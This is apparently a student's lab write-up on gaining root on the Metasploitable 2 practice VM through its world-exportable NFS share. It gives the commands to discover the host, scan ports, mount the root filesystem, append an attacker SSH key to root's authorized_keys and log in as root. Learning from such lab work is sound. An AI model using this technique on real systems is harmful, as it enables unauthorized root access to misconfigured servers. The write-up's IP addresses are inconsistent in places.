# Metasploitable 2 NFS exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - NFS (**N**etwork **F**ile **S**ystrem).



 > The target of this lab is use vulnerablitity in **NFS** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
2049/tcp open  nfs         2-4 (RPC #100003)
.
.
```

As this port is open, now we'll start further process.

Firstly, we'll check if any share is available for mount using:

`showmount -e 192.168.43.95`

```
Export list for 192.168.43.95:
/ *
```
This output suggest machine on the network is allowed to mount the files of this machine.


So now, we'll create a directory on which we'll mount files of machine.

`mkdir -p /mnt/anyway`

With this command we can mount the remote machine on our local machine:
`sudo mount -o nolock 192.168.43.95:/ /mnt/anyway`

Now we'll create an ssh key on our machine using:
`ssh-keygen`



Now we'll copy the ssh key on **/mnt/anyway/root/.ssh/authorized_keys**

```cat /root/.ssh/id_rsa.pub >> /mnt/anyway/root/.ssh/authorized_keys```

> Here we just create *ssh key* and put that key into the file system of remote machine that we have mounted in our machine, this works because remote machine has vulnerabilties of NFS. As the SSH key - that is our login creditalis (maybe), is putted into the **authorized_keys**, so now if we - having our ssh key by defualt, try to log in remote machine noramlly, it will look into it's authorized key and try matching our ssh key with it.

As we have already have copied that ssh into authorized key, it will log in us into remote machine, as;

## Exploitation:

Now just log in the remote machine by using ssh:

```
┌──(root㉿anyway)-[/mnt/anyway/root/.ssh]
└─# ssh -i id_rsa root@192.168.43.95
```

And that's it;
```
RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.43.95' (RSA) to the list of known hosts.
Last login: Tue Jul  9 04:15:30 2024 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# whoami
root
```